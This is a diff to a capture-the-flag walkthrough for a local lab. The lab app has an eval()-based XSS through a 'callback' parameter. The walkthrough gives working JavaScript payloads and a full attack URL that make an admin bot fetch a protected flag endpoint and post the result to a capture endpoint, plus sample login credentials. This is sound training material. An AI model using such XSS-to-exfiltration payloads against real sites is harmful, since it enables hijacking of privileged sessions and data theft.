@@ -56,7 +56,7 @@ Player crafts URL with XSS payload
 
 ### Step-by-Step Exploitation
 
-#### Step 1: Identify the XSS
+#### Step 1: Discover the `callback` Parameter XSS
 
 Navigate to the Knowledge Base (`/kb`) and try adding a `callback` parameter:
 
@@ -64,32 +64,116 @@ Navigate to the Knowledge Base (`/kb`) and try adding a `callback` parameter:
 http://localhost:5174/kb?search=test&callback=alert(1)
 ```
 
-You should see an `alert(1)` pop up, confirming arbitrary JavaScript execution.
+You should see an `alert(1)` pop up, confirming arbitrary JavaScript execution via `eval()`.
 
-#### Step 2: Understand the Flag System
+**Rationale:** The Knowledge Base page reflects the `callback` URL parameter directly into `eval()` without sanitization. This is the intended vulnerability entry point.
 
+---
+
+#### Step 2: Confirm the Bot Visits Reported URLs
+
+Submit a simple report that exfiltrates data to confirm the bot is actually executing your code:
+
+1. Go to **Report** page (`/report`)
+2. Submit this URL:
+```
+http://localhost:5174/kb?search=test&callback=fetch('/api/exfil/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({data:'bot_was_here',reportId:'test'})})
+```
+3. After a few seconds, go to **My Captures** page (`/captures`)
+4. You should see an entry with `data: 'bot_was_here'` — confirming the bot executed your payload
+
+**Rationale:** This validates that the bot is an automated actor with a real browser session. You now know payloads you submit will be executed.
+
+---
+
+#### Step 3: Discover `_reportId` via Report Status
+
+After submitting a report, the **Report** page shows a card for each report with:
+- **🤖 Bot visited URL** (highlighted in blue)
+- **Status badge** (green when visited)
+- **Expandable bot console logs**
+
+**Look at the "Bot visited URL" field** — it will show the exact URL the bot visited, including the `_reportId` query parameter appended by the bot.
+
+Example: `http://localhost:5174/kb?search=test&callback=...&_reportId=7`
+
+**Rationale:** The `_reportId` is automatically appended by the bot when visiting your URL. By viewing the report card, you can see the exact query string the bot used, revealing the `_reportId` value without needing to exfiltrate the URL yourself.
+
+---
+
+#### Step 4: Discover the Admin Flag Endpoint
+
+Try to access the flag endpoint:
+
+```
+http://localhost:4001/api/admin/flag?reportId=1
+
+(http://localhost:4001/api/admin/flag also works)
+
+(http://localhost:5174/api/admin/flag also works)
+
+```
+
+You'll get a `403 Forbidden` response with a hint:
+```json
+{
+  "error": "Admin access required",
+  "hint": "This endpoint requires admin authentication. Expected query param: reportId"
+}
+```
+
+**Rationale:** The 403 response confirms that `/api/admin/flag` exists and expects a `reportId` parameter. The hint reveals that the endpoint returns a flag when accessed with admin privileges — which your bot has.
+
+---
+
+#### Step 5: Discover the Exfiltration Endpoint
+
+Go to **My Captures** page (`/captures`). If it's empty, you'll see a hint box explaining:
+
+```
+Endpoint: POST /api/exfil/capture
+Expected JSON body: {"data": ..., "reportId": ...}
+No authentication required on this endpoint.
+```
+
+**Rationale:** The hint reveals that exfiltration is public (no auth needed) and explains the JSON schema. This removes the guesswork around how to capture data.
+
+---
+
+#### Step 6: Understand the Flag System
+
+Key facts:
 - Each user has a **unique flag** stored in the database
-- The admin endpoint `GET /api/admin/flag?reportId=X` returns the flag of the **user who submitted report X** (not the admin's flag)
-- When the bot visits your URL, it appends `?_reportId=X` so your payload can reference it
-- The exfiltration endpoint `POST /api/exfil/capture` is public (no auth required)
-- You can view your captures at `/captures` (authenticated)
+- `GET /api/admin/flag?reportId=X` returns the flag of the **user who submitted report X** (not the admin's flag)
+- The bot visits URLs as an **authenticated admin user**, so it can call the admin endpoint
+- When the bot visits your URL, it automatically appends `&_reportId=X` so your payload can reference it
+- You can view exfiltrated flags at `/captures` (authenticated)
 
-#### Step 3: Craft the Payload
+**Rationale:** Understanding this data flow is critical — you must make the bot (which has admin access) fetch the admin endpoint and exfiltrate the flag back to a public endpoint you can read.
 
-The payload must:
-1. Read `_reportId` from the URL (appended by the bot)
-2. Fetch the admin flag endpoint with that reportId
-3. POST the result to the exfil capture endpoint
+---
 
-**Key constraint:** In URL query strings, `+` is decoded as a **space**. You must use `.concat()` instead of `+` for string concatenation in the callback value.
+#### Step 7: Craft the Final Exploit Payload
 
-**The payload (readable):**
+Now you have all the pieces. The payload must:
+1. Read `_reportId` from the URL query string (appended by the bot)
+2. Fetch the admin-only `/api/admin/flag?reportId=X` endpoint
+3. Wait for the JSON response (which contains your flag)
+4. POST the flag to `/api/exfil/capture` endpoint
+5. Include the `reportId` so you can retrieve it later
+
+**The payload (readable with comments):**
 ```javascript
+// Construct the admin flag URL with _reportId param
 fetch('/api/admin/flag?reportId='.concat(
   new URLSearchParams(location.search).get('_reportId')
-)).then(function(r) {
+))
+// Parse the response JSON
+.then(function(r) {
   return r.json()
-}).then(function(d) {
+})
+// Exfiltrate the flag to the public capture endpoint
+.then(function(d) {
   fetch('/api/exfil/capture', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
@@ -101,47 +185,104 @@ fetch('/api/admin/flag?reportId='.concat(
 })
 ```
 
-**The payload (one-liner for the URL):**
+**The payload (one-liner for URL parameter):**
 ```
 fetch('/api/admin/flag?reportId='.concat(new URLSearchParams(location.search).get('_reportId'))).then(function(r){return r.json()}).then(function(d){fetch('/api/exfil/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({data:d,reportId:new URLSearchParams(location.search).get('_reportId')})})})
 ```
 
-#### Step 4: Construct the Full URL
+**Key technical detail — Use `.concat()` NOT `+`:**
 
+In URL query strings, `+` is decoded as a **space character** (RFC 1866). This breaks string concatenation:
 ```
-http://localhost:5174/kb?search=test&callback=fetch('/api/admin/flag?reportId='.concat(new+URLSearchParams(location.search).get('_reportId'))).then(function(r){return+r.json()}).then(function(d){fetch('/api/exfil/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({data:d,reportId:new+URLSearchParams(location.search).get('_reportId')})})})
+callback=a+b          →  eval("a b")       ← SyntaxError!
+callback=a.concat(b)  →  eval("a.concat(b)") ← works!
 ```
 
-> **Note:** In the URL, `+` between words represents a space (standard URL encoding). Inside `.concat()`, `'...'` string literals use `%27` for single quotes. The bot appends `&_reportId=X` automatically.
-
-#### Step 5: Submit the Report
-
-1. Log in with your assigned credentials
-2. Navigate to the **Report** page (`/report`)
-3. Paste the full URL from Step 4 into the URL field
-4. Submit the report
-
-#### Step 6: Wait and Retrieve Your Flag
-
-1. The bot picks up the report from the queue within a few seconds
-2. It logs in as admin and visits your URL
-3. The `eval(callback)` executes your payload in the admin's session
-4. The admin's cookies authenticate the `/api/admin/flag` request
-5. The flag is POSTed to `/api/exfil/capture`
-6. Navigate to the **My Captures** page (`/captures`) to see your flag
+The `.concat()` method is literally in the source code so it survives URL encoding and decoding unchanged.
 
 ---
 
-### Why `.concat()` Instead of `+`?
+#### Step 8: Construct and Submit the Full URL
 
-URL query strings use `+` as an encoding for space (RFC 1866). When the browser's `URLSearchParams.get('callback')` decodes the parameter value, any `+` becomes a literal space character. This means:
-
+**Safe version** (ready to copy-paste into the Report form):
 ```
-callback=a+b     →  eval("a b")      ← SyntaxError!
-callback=a.concat(b)  →  eval("a.concat(b)")  ← works!
+http://localhost:5174/kb?search=test&callback=fetch('/api/admin/flag?reportId='.concat(new URLSearchParams(location.search).get('_reportId'))).then(function(r){return r.json()}).then(function(d){fetch('/api/exfil/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({data:d,reportId:new URLSearchParams(location.search).get('_reportId')})})})
 ```
 
-Similarly, `return+r.json()` is valid JavaScript because `return` followed by `+r.json()` is a unary plus (returns the value of `r.json()`).
+Steps to submit:
+1. **Log in** with your assigned credentials (e.g., `abcd12` / `KHXXSIILQYIF`)
+2. Go to **Report** page (`/report`)
+3. Paste the full URL above into the **URL field**
+4. Click **Submit Report**
+
+**Rationale:** The `/report` endpoint validates that the URL is a KB path, then queues the URL to the BullMQ worker. The bot picks up the job and visits the URL as an authenticated admin.
+
+---
+
+#### Step 9: Wait for Bot Processing and Retrieve Your Flag
+
+1. **Wait 2-5 seconds** for the bot to process your report from the queue
+2. Go back to the **Report** page to see the updated report card
+3. Check the **bot console logs** (click "Show bot console logs") to debug if anything went wrong
+4. Navigate to **My Captures** page (`/captures`)
+5. Your flag will appear as a captured entry containing `{"flag": "CTF{user_<username>_<hash>}"}`
+
+**Rationale:** The bot logs in as admin, visits your URL, executes the payload in its admin session, fetches the admin-only flag endpoint (which returns your flag), and POSTs it to the public exfil endpoint. You then read it back as yourself.
+
+---
+
+### Technical Troubleshooting
+
+#### Bot Console Logs Not Showing?
+
+The **Report** page now displays bot console logs in an expandable section. Check these logs if your payload fails silently:
+
+- **`[error]` messages** indicate JavaScript errors in your payload
+- **`[log]` messages** are your `console.log()` calls (you can add these to debug)
+- **`[warn]` messages** are warnings
+
+**How to add debugging to your payload:**
+```javascript
+console.log('_reportId:', new URLSearchParams(location.search).get('_reportId'));
+// ... rest of payload ...
+```
+
+Then check the bot console logs to verify the `_reportId` was found.
+
+#### Flag Not Appearing in Captures?
+
+- **Wait 5+ seconds** — the bot might still be processing
+- **Check bot console logs** for errors
+- **Verify the `reportId` in the exfil body** matches the actual report ID
+- **Check browser console** (Ctrl+Shift+J) for any client-side errors
+
+#### URL Plus Sign Encoding Issue
+
+If your payload has `+` in it (like `a+b`), it will be decoded as a space in `eval()`, causing `SyntaxError`. Use `.concat()` instead:
+
+```javascript
+// ❌ Wrong — `+` becomes space after URL decoding
+'hello' + 'world'
+
+// ✅ Correct — `.concat()` survives URL encoding
+'hello'.concat('world')
+```
+
+---
+
+### Challenge Summary
+
+| Aspect | Detail |
+|---|---|
+| **Vulnerability** | DOM XSS via `eval(callback)` in KnowledgeBase.tsx |
+| **Bot Role** | Privileged actor (admin) that visits your reported URL |
+| **Privilege Escalation** | Bot's admin session grants access to `/api/admin/flag` |
+| **Key Discovery** | `_reportId` appended by bot, visible in Report card |
+| **Exfiltration** | Public endpoint `/api/exfil/capture` (no auth required) |
+| **Flag Retrieval** | Unique per-user flag accessed via `/captures` page |
+| **Scaffolding** | Visited URL, bot console logs, and 403 hints reduce friction |
+
+---
 
 ---
 
